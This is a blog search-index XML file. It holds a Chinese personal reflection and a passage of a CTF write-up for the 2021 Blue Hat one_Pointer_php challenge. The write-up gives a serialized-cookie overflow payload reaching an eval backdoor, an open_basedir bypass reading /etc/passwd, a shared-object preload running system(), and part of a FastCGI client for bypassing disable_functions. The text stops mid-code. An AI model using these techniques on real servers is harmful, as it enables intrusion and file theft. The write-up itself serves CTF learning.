<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>闲谈</title>
      <link href="2021/04/30/%E9%97%B2%E8%B0%88/"/>
      <url>2021/04/30/%E9%97%B2%E8%B0%88/</url>
      
        <content type="html"><![CDATA[<p>时间总是过得飞快，进入大学已经快两年了，四月将过，五一假期要回一趟家看看老爷子和老妈子，晚上和佳去神龙湖转了转，风景还是很不错。</p><p><img src="https://i.loli.net/2021/04/30/QaUsXqS9BAEPg7k.jpg" alt="神龙大剧院"></p><p>洗澡的时候想了想似乎从来没有给自己写过什么所谓的总结，回想自己这 19 年，中二、傻逼的事情做了不少，就是认真的事情做得太少了，让爸妈头疼担心，也让很多人失望。</p><p>和佳闲谈的时候聊起来小时候的事情，总是会觉得特别有意思，那个时候觉得很帅、很装B的事情，现在看起来尴尬到可以用脚趾抠出三室两厅，每次调侃自己当时被家里老爷子抓着痛打的时候，也会想到当时的自己为什么那么会闯祸惹事，那个时候的自己要是知道多年之后自己把这一切当作茶余饭后的乐子津津有味地品尝时，会不会稍微乖一点，少让老爷子气得睡不着觉。</p><p>从小到大就一直不喜欢做老师布置的作业，直到今天这一点也没有变过，大学以前是因为纯粹的懒，大学的时候是感觉那些作业确实是做了没用，虽然归根结底还是懒，但毕竟👴也一直不是个听话的好孩子，所以无所谓了。</p><p>一直都挺没心没肺，小学是，初中是，高中有改变，但是也确实是这样，直到现在也会偶尔犯病，不过总归是没小时候那么没血了。怎么说呢，高中是转变最大的一段时期，遇到了一群一辈子的好兄弟，狐朋狗友确实也不过如此，也感谢 @教授 @典哥 @树文 @ 彭克 @壁 @ly @404 @504 你们这群逆天赐予了我 <code>堆</code> 这个名字，我以后也会一直带着，确实被叫惯了堆堆，在大学的时候我也让周围的人叫我堆堆，以后入土为安，把它再带到下面去，挺好。</p><p>怀念每个下课和壁哥冲到二楼球桌狠抽几球的高一；隔三岔五就和教授、ly、小不点在厕所深夜闲谈；为自己某次超常发挥的英语沾沾自喜；高三下了还不忘逃课去打篮球，被抓住差点记个处分，甚至第一次进网吧，也是高三下。回味起来还挺有意思，高一上的时候每晚都会和壁哥百米冲刺跑到那里去吃一碗比白天好吃多了的蛋炒饭，临走的时候捎点火腿，简直就是最好吃的夜宵。</p><p>也经常会问问自己，以后想干什么，望着不讨喜的成绩也有不甘堕落，高三的时候硬是挤进了所谓的精英班，随缘考试，成绩有好有坏，但反正高考是不好就完事了。高考之后的那段时间确实是最好玩的时间，每天出门疯，高考前制定的书单计划也是上了大学才想起来有这么一回事，和兄弟们一起去了桂林、海南玩，想来，这群狐朋狗友，似乎真是千金难换吧。</p><p><img src="https://i.loli.net/2021/05/01/iAO5pkrBnPWVMU3.jpg" alt="桂林阳朔"></p><p>大一上期的时候，听着老爷子的报了计算机，一开始也只是想着就那样学学吧，混着完事了，不过遇到了她之后，便和自己较上了劲来，不再玩游戏，也不参加所谓的娱乐活动，最开始的时候吧，拼命学 ACM，就为了可以比这个女孩子更强，“👴不能让一个女孩子撑我们班的牌面”，也成了当时👴学习的一个“借口”，23333。后来和她一起进了实验室，把她的手握在手里，两个人一起计划着未来，讨论着要一起努力，这些就成了👴学习最大的动力。</p><p>接触网安也便是从进实验室开始的，来到了 508，遇到了一群志同道合的 hxd（指干饭），忘不了和卓哥在小黑屋里面狂干课设，一切吃夜宵；和老谢老秦去比赛线下通宵打联盟（虽然👴先溜了），事后听说老樊骂了一晚上人（笑死）；和组里聚个小会喝多了酒，被一群人看着跌跌撞撞跑回寝室，多月之后还帮忙回忆（丢脸）。</p><p>后来大一下期的疫情，一直待在家里，状态被消磨殆尽，又变得懒且愚钝，又开始打游戏，直到大二的下期才缓过来，又捡起学得一知半解的一肚子半吊子学问，沉了沉心去学，感觉这才叫学到了东西，以前的那些浮在天上的学习，半桶水的自己，根本啥也不会。很喜欢谭总的一句话：“你有点浮躁了”，确实是很浮躁了，所以还是要继续静下心去学，不能再逃避了。</p><p>接下来的话，希望自己可以沉稳一点，也要快快学到更多知识，带好铁三和国赛，想干的事就去干，想要坚持的博客也要一直更，不要再像以前那样喜欢做鸽子，喜欢搞“拖，就硬拖”了。</p><hr><p>@卓哥 @老秦 @圆子 @菲姐 @泽辰 @老谢 @老樊 @放放，没啥事，就单纯想 @ 你们一下，以后继续一起好好干饭（bushi，好好努力），相信 508 的干饭之魂会越来越盛，直到突破地平线，超越银河系。</p><p>@515 大家都是宁乡的逆天，还有两年，反正就是要赖着继续麻烦你们这群狗儿子了，还有上了大学还可以遇到 @ly 你这个逆天做同学做室友，确实晦气。</p><p>@佳 遇到了你，是👴最幸运，也是👴最幸福的事情，Je t’aime pour toujours.</p>]]></content>
      
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
            <tag> 成长 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021_Blue_Hat_WP</title>
      <link href="2021/04/29/2021-Blue-Hat-WP/"/>
      <url>2021/04/29/2021-Blue-Hat-WP/</url>
      
        <content type="html"><![CDATA[<p>怎么说呢，比赛安排在周四，没啥时间打，队友们都上课去了，我寝室也有事情，所以这次比赛就这样了，打得不好，但是赛后还是要复现一下。</p><h1 id="web1-Ball-sigin"><a href="#web1-Ball-sigin" class="headerlink" title="web1 Ball_sigin"></a>web1 Ball_sigin</h1><p>签到题，js 游戏，没看。</p><p>真的是玩游戏，没事了。</p><h1 id="web2-one-Pointer-php"><a href="#web2-one-Pointer-php" class="headerlink" title="web2 one_Pointer_php"></a>web2 one_Pointer_php</h1><p>php，最终目的 disable_function，不会，等一波赛后 WP 复现了。</p><p><code>user.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$count</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>add_api.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;user.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>=unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&quot;data&quot;</span>]))&#123;</span><br><span class="line"><span class="variable">$count</span>[++<span class="variable">$user</span>-&gt;count]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$count</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line"><span class="variable">$user</span>-&gt;count+=<span class="number">1</span>;</span><br><span class="line">setcookie(<span class="string">&quot;data&quot;</span>,serialize(<span class="variable">$user</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&quot;backdoor&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$user</span>=<span class="keyword">new</span> User;</span><br><span class="line"><span class="variable">$user</span>-&gt;count=<span class="number">1</span>;</span><br><span class="line">setcookie(<span class="string">&quot;data&quot;</span>,serialize(<span class="variable">$user</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以注意到我们需要执行 eval，但是我们先要使 <code>$count=1</code> 返回一个 false，怎样才能让一个不是赋 0 的赋值语句返回 false 呢……</p><p>想到了溢出，关于 <code>$count[]=1</code>，我们可以发现这样一个有趣的现象：</p><p><img src="http://i.loli.net/2021/04/29/IetDslwnc62dPm5.png"></p><p>可以观察到 <code>$count[]=2</code>，会数组的从最后一位位置向后 add，所以如果我们使用 php max long 的话，应该可以使返回出现问题从而绕过 <code>if($count[]=1)</code></p><p><img src="https://i.loli.net/2021/04/29/wtO6uyTjIdQS84C.png"></p><p>可以发现确实报错了，所以我们可以开始 eval 了，构造 data：<code>O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bi%3A9223372036854775806%3B%7D</code></p><p><img src="https://i.loli.net/2021/04/29/YEx4eDXmy8AbfrL.png"></p><p>success，ok，看看 <code>disable_function</code> 吧：</p><p><img src="https://i.loli.net/2021/04/29/LCEiHt2A3NUDTsP.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">disable_classes: Exception,SplDoublyLinkedList,Error,ErrorException,ArgumentCountError,ArithmeticError,AssertionError,DivisionByZeroError,CompileError,ParseError,TypeError,ValueError,UnhandledMatchError,ClosedGeneratorException,LogicException,BadFunctionCallException,BadMethodCallException,DomainException,InvalidArgumentException,LengthException,OutOfRangeException,PharException,ReflectionException,RuntimeException,OutOfBoundsException,OverflowException,PDOException,RangeException,UnderflowException,UnexpectedValueException,JsonException,SodiumException</span><br><span class="line">disable_functions: stream_socket_client,fsockopen,putenv,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,iconv,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,error_log,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive</span><br></pre></td></tr></table></figure><p>好狠，之前 @LemonPrefect 师傅和👴说他觉得可以试试反射类：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> ReflectionClass(system(<span class="string">&#x27;calc&#x27;</span>)()) ;</span><br><span class="line"><span class="variable">$count</span>[++<span class="variable">$a</span>]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$count</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;No&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Yes&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不过 <code>disable_classes</code> 里面把能封的都封了，所以没办法，只能绕 df 了，害，不会了。</p><p>可以通过 <code>DirectoryIterator</code> 列出目录：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123; <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&#x27;&lt;br&gt;&#x27;</span>); &#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/30/3geAkJQvWsECufP.png"></p><p>有 <code>open_basedir</code>，绕一下可以读取一些基本文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mkdir(<span class="string">&#x27;Du1&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;Du1&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">var_dump(file_get_contents(<span class="string">&quot;/etc/passwd&quot;</span>));</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/30/WM2oOZxlL6GhHQ9.png"></p><p>flag 读不了，参考了 <a href="https://ha1c9on.top/2021/04/29/lmb_one_pointer_php/#i-5">@HA1C9ON</a> 大佬的博客发现读取 <code>php.ini</code> 可以发现 so 文件，不过 BUU 里把这个预期解删掉了，但是还有别的方法可以做。</p><p><img src="https://i.loli.net/2021/04/30/waLhi9n3coeWUAC.png"></p><p><code>hpdoger.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;ls / &gt;/var/www/html/1&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc hpdoger.c -fPIC -shared -o hpdoger.so</span><br></pre></td></tr></table></figure><p><code>fastcgi.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note : Code is released under the GNU LGPL</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Please do not change the header of this file</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This library is free software; you can redistribute it and/or modify it under the terms of the GNU</span></span><br><span class="line"><span class="comment"> * Lesser General Public License as published by the Free Software Foundation; either version 2 of</span></span><br><span class="line"><span class="comment"> * the License, or (at your option) any later version.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;</span></span><br><span class="line"><span class="comment"> * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * See the GNU Lesser General Public License for more details.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Handles communication with a FastCGI application</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>      Pierrick Charron &lt;pierrick<span class="doctag">@webstart</span>.fr&gt;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span>     1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FCGIClient</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> VERSION_1            = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> BEGIN_REQUEST        = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> ABORT_REQUEST        = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> END_REQUEST          = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> PARAMS               = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">const</span> STDIN                = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">const</span> STDOUT               = <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">const</span> STDERR               = <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">const</span> DATA                 = <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">const</span> GET_VALUES           = <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">const</span> GET_VALUES_RESULT    = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">const</span> UNKNOWN_TYPE         = <span class="number">11</span>;</span><br><span class="line">    <span class="keyword">const</span> MAXTYPE              = <span class="built_in">self</span>::UNKNOWN_TYPE;</span><br><span class="line">    <span class="keyword">const</span> RESPONDER            = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> AUTHORIZER           = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> FILTER               = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> REQUEST_COMPLETE     = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> CANT_MPX_CONN        = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> OVERLOADED           = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> UNKNOWN_ROLE         = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> MAX_CONNS            = <span class="string">&#x27;MAX_CONNS&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> MAX_REQS             = <span class="string">&#x27;MAX_REQS&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> MPXS_CONNS           = <span class="string">&#x27;MPXS_CONNS&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> HEADER_LEN           = <span class="number">8</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Socket</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Resource</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_sock</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Host</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> String</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_host</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Port</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Integer</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_port</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Keep Alive</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Boolean</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_keepAlive</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Constructor</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $host Host of the FastCGI application</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer $port Port of the FastCGI application</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$host</span>, <span class="variable">$port</span> = <span class="number">9000</span></span>) // <span class="title">and</span> <span class="title">default</span> <span class="title">value</span> <span class="title">for</span> <span class="title">port</span>, <span class="title">just</span> <span class="title">for</span> <span class="title">unixdomain</span> <span class="title">socket</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_host = <span class="variable">$host</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_port = <span class="variable">$port</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Define whether or not the FastCGI application should keep the connection</span></span><br><span class="line"><span class="comment">     * alive at the end of a request</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Boolean $b true if the connection should stay alive, false otherwise</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setKeepAlive</span>(<span class="params"><span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_keepAlive = (<span class="keyword">boolean</span>)<span class="variable">$b</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;_keepAlive &amp;&amp; <span class="keyword">$this</span>-&gt;_sock) &#123;</span><br><span class="line">            fclose(<span class="keyword">$this</span>-&gt;_sock);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get the keep alive status</span></span><br><span class="line"><span 